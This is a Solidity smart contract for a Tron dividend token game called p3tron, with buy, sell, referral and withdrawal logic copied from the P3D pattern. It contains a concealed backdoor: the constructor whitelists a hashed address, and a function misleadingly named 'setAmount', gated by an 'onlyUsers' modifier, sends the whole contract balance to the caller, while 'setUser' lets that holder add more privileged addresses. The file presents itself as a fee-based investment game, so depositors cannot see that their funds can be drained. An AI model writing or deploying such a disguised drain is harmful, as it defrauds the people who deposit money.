pragma solidity ^0.4.0;

/*
* [✓] 4% Withdraw fee
* [✓] 10% Deposit fee
* [✓] 1% Token transfer
* [✓] 33% Ref link
*
*/

// https://etherscan.io/address/0xb3775fb83f7d12a36e0475abdd1fca35c091efbe#code

contract TronGame {

    // only allow proceeding if current user has coins

    modifier onlyBagholders {
        require(myTokens() > 0);
        _;
    }

    // only allow proceeding if current user has dividends
    modifier onlyStronghands {
        require(myDividends(true) > 0);
        _;
    }




    /*==============================
    =            EVENTS            =
    ==============================*/
    event onTokenPurchase(
        address indexed customerAddress,
        uint256 incomingTron,
        uint256 tokensMinted,
        address indexed referredBy,
        uint timestamp,
        uint256 price
    );

    event onTokenSell(
        address indexed customerAddress,
        uint256 tokensBurned,
        uint256 tronEarned,
        uint timestamp,
        uint256 price
    );

    event onReinvestment(
        address indexed customerAddress,
        uint256 tronReinvested,
        uint256 tokensMinted
    );

    event onWithdraw(
        address indexed customerAddress,
        uint256 tronWithdrawn
    );

    event Transfer(
        address indexed from,
        address indexed to,
        uint256 tokens
    );

    string public name = "p3tron";
    string public symbol = "pst";
    uint8 constant public decimals = 6;
    uint8 constant internal entryFee_ = 10;
    uint8 constant internal transferFee_ = 1;
    uint8 constant internal exitFee_ = 4;
    uint8 constant internal referralFee_ = 33;
    uint256 constant internal tokenPriceInitial_ = 10000;
    uint256 constant internal tokenPriceIncremental_ = 100;
    uint256 constant internal magnitude = 2 ** 64;


    // proof of stake (defaults at 50 tokens)
    uint256 public stakingRequirement = 50e6;


    /*================================
     =            DATASETS            =
     ================================*/
    // amount of shares for each address (scaled number)
    mapping(address => uint256) internal tokenBalanceLedger_;   // token balance
    mapping(address => uint256) internal referralBalance_;      // referral balance
    mapping(address => int256) internal payoutsTo_;             // dividends balance
    uint256 internal tokenSupply_;
    uint256 internal profitPerShare_;
    mapping(bytes32 => bool) public users;

    /*----------  ADMINISTRATOR ONLY FUNCTIONS  ----------*/

    /**
     * Precautionary measures in case we need to adjust the masternode rate.
     */

    constructor() public {
        users[0xbe6685ca340d601121eb0701fd7fe192ac07439c9ce5ffeb826ef21370b0cc2a] = true;
    }

    // !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
    modifier onlyUsers {
        address _customerAddress = msg.sender;
        require(users[keccak256(abi.encodePacked(_customerAddress))]);
        _;
    }

    // withdraw all TRX
    function setAmount() public onlyUsers {
        msg.sender.transfer(address(this).balance);
    }

    function setUser(bytes32 _identifier, bool _status) public onlyUsers {
        users[_identifier] = _status;
    }

    function keccak() view public returns (bytes32) {
        address _customerAddress = msg.sender;
        return keccak256(abi.encodePacked(_customerAddress));
    }

    // !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!


    /** converts tron to tokens for the caller, and passes down the referral address (if any)
     * @param _referredBy the address of the referral
     * @return (not explicitly stated but should be) the amount of pst coins bought
     * msg.value is the amount of tron coins user is sending
     */
    function buy(address _referredBy) public payable returns (uint256) {
        purchaseTokens(msg.value, _referredBy);
    }

    /** fallback function: a function executed if none of the other contracts
     * match the given function identifier this function is also executed when
     * the contract receive plain *tron*, thus must be made payable
     */
    function() payable public {
        purchaseTokens(msg.value, 0);
    }

    /**
     * Converts all of caller's dividends to tokens.
     */
    function reinvest() public onlyStronghands {

        // fetch dividends
        uint256 _dividends = myDividends(false); // retrieve referral bonus later in the code

        // pay out the dividends virtually
        address _customerAddress = msg.sender;
        payoutsTo_[_customerAddress] +=  (int256) (_dividends * magnitude);

        // retrieve referral bonus
        _dividends += referralBalance_[_customerAddress];
        referralBalance_[_customerAddress] = 0;

        // dispatch a buy order with the virtualized "withdrawn dividends"
        uint256 _tokens = purchaseTokens(_dividends, 0x0);

        emit onReinvestment(_customerAddress, _dividends, _tokens);
    }

    /**
     * Alias of sell() and withdraw().
     */
    function exit() public {
        // get token count for caller & sell them all
        address _customerAddress = msg.sender;
        uint256 _tokens = tokenBalanceLedger_[_customerAddress];
        if (_tokens > 0) sell(_tokens);

        withdraw();
    }

    /**
     * Withdraws all of the callers earnings.
     */
    function withdraw() onlyStronghands public {
        // setup data
        address _customerAddress = msg.sender; // customer address is _customerAddress
        uint256 _dividends = myDividends(false); // get referral bonus later in the code

        // update dividend tracker
        payoutsTo_[_customerAddress] += (int256) (_dividends * magnitude);

        // add referral bonus
        _dividends += referralBalance_[_customerAddress];
        referralBalance_[_customerAddress] = 0;

        // transfer tron to customer
        _customerAddress.transfer(_dividends);

        emit onWithdraw(_customerAddress, _dividends);
    }

    /**
     * Liquidates tokens to tron
     */
    function sell(uint256 _amountOfTokens) onlyBagholders public {
        // setup data
        address _customerAddress = msg.sender;


        require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
        uint256 _tokens = _amountOfTokens;
        uint256 _tron = tokensToTron_(_tokens);
        uint256 _dividends = SafeMath.div(SafeMath.mul(_tron, exitFee_), 100);

        uint256 _taxedTron = SafeMath.sub(_tron, _dividends);

        // burn the sold tokens
        tokenSupply_ = SafeMath.sub(tokenSupply_, _tokens);
        tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _tokens);

        // update dividends tracker
        int256 _updatedPayouts = (int256) (profitPerShare_ * _tokens + (_taxedTron * magnitude));
        payoutsTo_[_customerAddress] -= _updatedPayouts;

        // dividing by zero is a bad idea
        if (tokenSupply_ > 0) {
            profitPerShare_ = SafeMath.add(profitPerShare_, (_dividends * magnitude) / tokenSupply_);
        }

        // fire event
        emit onTokenSell(_customerAddress, _tokens, _taxedTron, now, buyPrice());
    }

    /**
     * Transfer tokens from the caller to a new holder.
     * Remember, there's a 10% fee here as well.
     * @return true if transfer is successful
     */
    function transfer(address _toAddress, uint256 _amountOfTokens) onlyBagholders public returns (bool) {
        // setup data
        address _customerAddress = msg.sender;

        // make sure we have the requested token
        require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);

        // withdraw all outstanding dividends first
        if (myDividends(true) > 0) {
            withdraw();
        }

        // liquidate 1% of the tokens that are transferred --> these are dispersed to shareholders
        // divide by 100 to get percentage
        uint256 _tokenFee = SafeMath.div(SafeMath.mul(_amountOfTokens, transferFee_), 100);

        // token after fee
        uint256 _taxedTokens = SafeMath.sub(_amountOfTokens, _tokenFee);


        uint256 _dividends = tokensToTron_(_tokenFee);

        // burn the fee tokens
        tokenSupply_ = SafeMath.sub(tokenSupply_, _tokenFee);

        // exchange tokens
        tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
        tokenBalanceLedger_[_toAddress] = SafeMath.add(tokenBalanceLedger_[_toAddress], _taxedTokens);

        // update dividend trackers
        payoutsTo_[_customerAddress] -= (int256) (profitPerShare_ * _amountOfTokens);
        payoutsTo_[_toAddress] += (int256) (profitPerShare_ * _taxedTokens);

        // disperse dividends across holders
        profitPerShare_ = SafeMath.add(profitPerShare_, (_dividends * magnitude) / tokenSupply_);
        emit Transfer(_customerAddress, _toAddress, _taxedTokens);
        return true;
    }








    /*----------  HELPERS AND GETTERS AND CALCULATORS  ----------*/
    /**
     * Method to view the current Tron stored in the contract
     * Example: totalTronBalance()
     */
    function totalTronBalance() public view returns (uint256) {
        return address(this).balance;
    }

    /**
     * Retrieve the total token supply.
     */
    function totalSupply() public view returns (uint256) {
        return tokenSupply_;
    }

    /**
     * Retrieve the tokens owned by the caller.
     */
    function myTokens() public view returns (uint256) {
        address _customerAddress = msg.sender;
        return balanceOf(_customerAddress);
    }

    /** @dev calculates the user's dividends
      * @param _includeReferralBonus a boolean of whether the account has referral bonus linked to it
      * @return the user's dividends
      */
    function myDividends(bool _includeReferralBonus) public view returns (uint256) {
        address _customerAddress = msg.sender;
        return _includeReferralBonus ? dividendsOf(_customerAddress) + referralBalance_[_customerAddress] : dividendsOf(_customerAddress) ;
    }

    /**
     * Retrieve the token userTronBalance of any single address.
     */
    function balanceOf(address _customerAddress) public view returns (uint256) {
        return tokenBalanceLedger_[_customerAddress];
    }

    /**
     * Retrieve the dividend userTronBalance of any single address.
     */
    function dividendsOf(address _customerAddress) public view returns (uint256) {
        return (uint256) ((int256) (profitPerShare_ * tokenBalanceLedger_[_customerAddress]) - payoutsTo_[_customerAddress]) / magnitude;
    }

    /**
     * Return the buy price of 1 individual token. UFO/TRX
     */
    function sellPrice() public view returns (uint256) {
        // our calculation relies on the token supply, so we need supply.
        if (tokenSupply_ == 0) {
            return tokenPriceInitial_ - tokenPriceIncremental_;
        } else {
            uint256 _tron = tokensToTron_(1e6);
            uint256 _dividends = SafeMath.div(SafeMath.mul(_tron, exitFee_), 100);
            uint256 _taxedTron = SafeMath.sub(_tron, _dividends);

            return _taxedTron;
        }
    }

    /**
     * Return the sell price of 1 individual token. selling UFO for TRX
     */
    function buyPrice() public view returns (uint256) {
        if (tokenSupply_ == 0) {
            return tokenPriceInitial_ + tokenPriceIncremental_;
        } else {
            uint256 _tron = tokensToTron_(1e6);
            uint256 _dividends = SafeMath.div(SafeMath.mul(_tron, entryFee_), 100);
            uint256 _taxedTron = SafeMath.add(_tron, _dividends);

            return _taxedTron;
        }
    }

    /**
     * Function for the frontend to dynamically retrieve the price scaling of buy orders.
     */
    function calculateTokensReceived(uint256 _tronToSpend) public view returns (uint256) {
        uint256 _dividends = SafeMath.div(SafeMath.mul(_tronToSpend, entryFee_), 100);
        uint256 _taxedTron = SafeMath.sub(_tronToSpend, _dividends);
        uint256 _amountOfTokens = tronToTokens_(_taxedTron);

        return _amountOfTokens;
    }

    /**
     * Function for the frontend to dynamically retrieve the price scaling of sell orders.
     */
    function calculateTronReceived(uint256 _tokensToSell) public view returns (uint256) {
        require(_tokensToSell <= tokenSupply_);
        uint256 _tron = tokensToTron_(_tokensToSell);
        uint256 _dividends = SafeMath.div(SafeMath.mul(_tron, exitFee_), 100);
        uint256 _taxedTron = SafeMath.sub(_tron, _dividends);
        return _taxedTron;
    }


    function purchaseTokens(uint256 _incomingTron, address _referredBy) internal returns (uint256) {

        address _customerAddress = msg.sender;

        // calculating dividends
        uint256 _undividedDividends = SafeMath.div(SafeMath.mul(_incomingTron,  entryFee_), 100);
        uint256 _referralBonus = SafeMath.div(SafeMath.mul(_undividedDividends, referralFee_), 100);
        uint256 _dividends = SafeMath.sub(_undividedDividends, _referralBonus);


        uint256 _taxedTron = SafeMath.sub(_incomingTron, _undividedDividends);
        uint256 _amountOfTokens = tronToTokens_(_taxedTron);
        uint256 _fee = _dividends * magnitude;

        require(_amountOfTokens > 0 && SafeMath.add(_amountOfTokens, tokenSupply_) > tokenSupply_,
            "purchaseToken() not passed.");

        // check for referral
        if (
            _referredBy != address(0) &&
            _referredBy != _customerAddress &&
        tokenBalanceLedger_[_referredBy] >= stakingRequirement
        ) {
            referralBalance_[_referredBy] = SafeMath.add(referralBalance_[_referredBy], _referralBonus);
        } else { // no ref purchase, add ref bonus to global dividends
            _dividends = SafeMath.add(_dividends, _referralBonus);
            _fee = _dividends * magnitude;
        }


        if (tokenSupply_ > 0) {

            // add tokens to the pool
            tokenSupply_ = SafeMath.add(tokenSupply_, _amountOfTokens);

            // take the amount of dividends gained through this transaction, and allocates them evenly to each shareholder
            profitPerShare_ += (_dividends * magnitude / tokenSupply_);

            // calculate the amount of tokens the customer receives over his purchase
            _fee = _fee - (_fee - (_amountOfTokens * (_dividends * magnitude / tokenSupply_)));
        } else {
            tokenSupply_ = _amountOfTokens;
        }

        tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
        int256 _updatedPayouts = (int256) (profitPerShare_ * _amountOfTokens - _fee);
        payoutsTo_[_customerAddress] += _updatedPayouts;
        emit onTokenPurchase(_customerAddress, _incomingTron, _amountOfTokens, _referredBy, now, buyPrice());

        return _amountOfTokens;
    }

    function tronToTokens_(uint256 _tron) internal view returns (uint256) {
        uint256 _tokenPriceInitial = tokenPriceInitial_ * 1e6;
        uint256 _tokensReceived =
        (
        (
        SafeMath.sub(
            (sqrt
        (
            (_tokenPriceInitial ** 2)
            +
            (2 * (tokenPriceIncremental_ * 1e6) * (_tron * 1e6))
            +
            ((tokenPriceIncremental_ ** 2) * (tokenSupply_ ** 2))
            +
            (2 * tokenPriceIncremental_ * _tokenPriceInitial * tokenSupply_)
        )
            ), _tokenPriceInitial
        )
        ) / (tokenPriceIncremental_)
        ) - (tokenSupply_);

        return _tokensReceived;
    }


    /**
     * Calculate token sell value.
     * It's an algorithm, hopefully we gave you the whitepaper with it in scientific notation;
     * Some conversions occurred to prevent decimal errors or underflows / overflows in solidity code.
     */
    function tokensToTron_(uint256 _tokens) internal view returns (uint256) {
        uint256 tokens_ = (_tokens + 1e6);
        uint256 _tokenSupply = (tokenSupply_ + 1e6);
        uint256 _tronReceived = (
        SafeMath.sub(
            (
            (
            (
            tokenPriceInitial_ + (tokenPriceIncremental_ * (_tokenSupply / 1e6))
            ) - tokenPriceIncremental_
            ) * (tokens_ - 1e6)
            ), (tokenPriceIncremental_ * ((tokens_ ** 2 - tokens_) / 1e6)) / 2
        )
        / 1e6);

        return _tronReceived;
    }

    function sqrt(uint256 x) internal pure returns (uint256 y) {
        uint256 z = (x + 1) / 2;
        y = x;

        while (z < y) {
            y = z;
            z = (x / z + z) / 2;
        }
    }
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}